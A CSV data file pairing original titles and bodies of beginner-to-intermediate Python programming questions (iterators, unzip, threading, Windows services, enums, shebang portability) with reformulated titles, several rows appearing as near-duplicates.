originalTitle,body,reformulatedTitle
cx_Oracle - what is the best way to iterate over a result set?, There are several ways to iterate over a result set. What are the tradeoff of each? <code> ,cx_Oracle: How do I iterate over a result set?
What is the best way to iterate over a result set?, There are several ways to iterate over a result set. What are the tradeoff of each? <code> ,cx_Oracle: How do I iterate over a result set?
Adding a Method to an Existing Object," I've read that it is possible to add a method to an existing object (i.e., not in the class definition) in Python. I understand that it's not always good to do so. But how might one do this? <code> ",Adding a Method to an Existing Object Instance
How to sell Python to a client/boss/person with lots of cash," When asked to create system XYZ and you ask to do it in Python over PHP or Ruby, what are the main features you can mention when they require you to explain it? <code> ",How to sell Python to a client/boss/person
Build a Basic Python Iterator, How would one create an iterative function (or iterator object) in python? <code> ,How to build a basic iterator?
How to make class iterable?, How would one create an iterative function (or iterator object) in python? <code> ,How to build a basic iterator?
Build a basic Python iterator, How would one create an iterative function (or iterator object) in python? <code> ,How to build a basic iterator?
A Transpose/Unzip Function in Python," I have a list of 2-item tuples and I'd like to convert them to 2 lists where the first contains the first item in each tuple and the second list holds the second item.For example: Is there a builtin function that does that? <code>  original = [('a', 1), ('b', 2), ('c', 3), ('d', 4)]# and I want to become...result = (['a', 'b', 'c', 'd'], [1, 2, 3, 4])",Transpose/Unzip Function (inverse of zip)?
A Transpose/Unzip Function in Python (inverse of zip)," I have a list of 2-item tuples and I'd like to convert them to 2 lists where the first contains the first item in each tuple and the second list holds the second item.For example: Is there a builtin function that does that? <code>  original = [('a', 1), ('b', 2), ('c', 3), ('d', 4)]# and I want to become...result = (['a', 'b', 'c', 'd'], [1, 2, 3, 4])",Transpose/Unzip Function (inverse of zip)?
How do I download a file over HTTP using Python?," I have a small utility that I use to download an MP3 file from a website on a schedule and then builds/updates a podcast XML file which I've added to iTunes.The text processing that creates/updates the XML file is written in Python. However, I use wget inside a Windows .bat file to download the actual MP3 file. I would prefer to have the entire utility written in Python.I struggled to find a way to actually download the file in Python, thus why I resorted to using wget.So, how do I download the file using Python? <code> ",How to download a file over HTTP?
"How do threads work in python, and what are common python-threading specific pitfalls?"," I've been trying to wrap my head around how threads work in Python, and it's hard to find good information on how they operate. I may just be missing a link or something, but it seems like the official documentation isn't very thorough on the subject, and I haven't been able to find a good write-up.From what I can tell, only one thread can be running at once, and the active thread switches every 10 instructions or so?Where is there a good explanation, or can you provide one? It would also be very nice to be aware of common problems that you run into while using threads with Python. <code> ","How do threads work in Python, and what are common Python-threading specific pitfalls?"
Programmatically editing python source," This is something that I think would be very useful. Basically, I'd like there to be a way to edit Python source programmatically without requiring human intervention. There are a couple of things I would like to do with this:Edit the configuration of Python apps that use source modules for configuration.Set up a ""template"" so that I can customize a Python source file on the fly. This way, I can set up a ""project"" system on an open source app I'm working on and allow certain files to be customized.I could probably write something that can do this myself, but I can see that opening up a lot of ""devil's in the details"" type issues. Are there any ways to do this currently, or am I just going to have to bite the bullet and implement it myself? <code> ",Programmatically editing Python source
Can I run a Python script as a service (in Windows)? How?," I am sketching the architecture for a set of programs that share various interrelated objects stored in a database. I want one of the programs to act as a service which provides a higher level interface for operations on these objects, and the other programs to access the objects through that service.I am currently aiming for Python and the Django framework as the technologies to implement that service with. I'm pretty sure I figure how to daemonize the Python program in Linux. However, it is an optional spec item that the system should support Windows. I have little experience with Windows programming and no experience at all with Windows services.Is it possible to run a Python programs as a Windows service (i. e. run it automatically without user login)? I won't necessarily have to implement this part, but I need a rough idea how it would be done in order to decide whether to design along these lines.Edit: Thanks for all the answers so far, they are quite comprehensive. I would like to know one more thing: How is Windows aware of my service? Can I manage it with the native Windows utilities? What is the equivalent of putting a start/stop script in /etc/init.d? <code> ",How do you run a Python script as a service in Windows?
"Is it possible to run a Python script as a service in Windows? If possible, how?"," I am sketching the architecture for a set of programs that share various interrelated objects stored in a database. I want one of the programs to act as a service which provides a higher level interface for operations on these objects, and the other programs to access the objects through that service.I am currently aiming for Python and the Django framework as the technologies to implement that service with. I'm pretty sure I figure how to daemonize the Python program in Linux. However, it is an optional spec item that the system should support Windows. I have little experience with Windows programming and no experience at all with Windows services.Is it possible to run a Python programs as a Windows service (i. e. run it automatically without user login)? I won't necessarily have to implement this part, but I need a rough idea how it would be done in order to decide whether to design along these lines.Edit: Thanks for all the answers so far, they are quite comprehensive. I would like to know one more thing: How is Windows aware of my service? Can I manage it with the native Windows utilities? What is the equivalent of putting a start/stop script in /etc/init.d? <code> ",How do you run a Python script as a service in Windows?
are python threads broken?, A reliable coder friend told me that Python's current multi-threading implementation is seriously buggy - enough to avoid using altogether. What can said about this rumor? <code> ,Are Python threads buggy?
Are python threads buggy?, A reliable coder friend told me that Python's current multi-threading implementation is seriously buggy - enough to avoid using altogether. What can said about this rumor? <code> ,Are Python threads buggy?
What's the best way to implement an 'enum' in Python?," I'm mainly a C# developer, but I'm currently working on a project in Python.How can I represent the equivalent of an Enum in Python?  <code> ",How can I represent an 'Enum' in Python?
How can I represent an 'enum' in Python?," I'm mainly a C# developer, but I'm currently working on a project in Python.How can I represent the equivalent of an Enum in Python?  <code> ",How can I represent an 'Enum' in Python?
What's the best way return multiple values from a function in Python?," I have a function where I need to do something to a string. I need the function to return a boolean indicating whether or not the operation succeeded, and I also need to return the modified string. In C#, I would use an out parameter for the string, but there is no equivalent in Python. I'm still very new to Python and the only thing I can think of is to return a tuple with the boolean and modified string.Related question: Is it pythonic for a function to return multiple values? <code> ",What's the best way to return multiple values from a function?
What's the best way to return multiple values from a function in Python?," I have a function where I need to do something to a string. I need the function to return a boolean indicating whether or not the operation succeeded, and I also need to return the modified string. In C#, I would use an out parameter for the string, but there is no equivalent in Python. I'm still very new to Python and the only thing I can think of is to return a tuple with the boolean and modified string.Related question: Is it pythonic for a function to return multiple values? <code> ",What's the best way to return multiple values from a function?
/usr/bin/env portability," At the beginning of all my executable Python scripts I put the shebang line: I'm running these scripts on a system where env python yields a Python 2.2 environment. My scripts quickly fail because I have a manual check for a compatible Python version: I don't want to have to change the shebang line on every executable file, if it's possible; however, I don't have administrative access to the machine to change the result of env python and I don't want to force a particular version, as in: I'd like to avoid this because system may have a newer version than Python 2.4, or may have Python 2.5 but no Python 2.4.What's the elegant solution?[Edit:] I wasn't specific enough in posing the question -- I'd like to let users execute the scripts without manual configuration (e.g. path alteration or symlinking in ~/bin and ensuring your PATH has ~/bin before the Python 2.2 path). Maybe some distribution utility is required to prevent the manual tweaks? <code>  #!/usr/bin/env python if sys.version_info < (2, 4): raise ImportError(""Cannot run with Python version < 2.4"") #!/usr/bin/env python2.4",Python deployment and /usr/bin/env portability
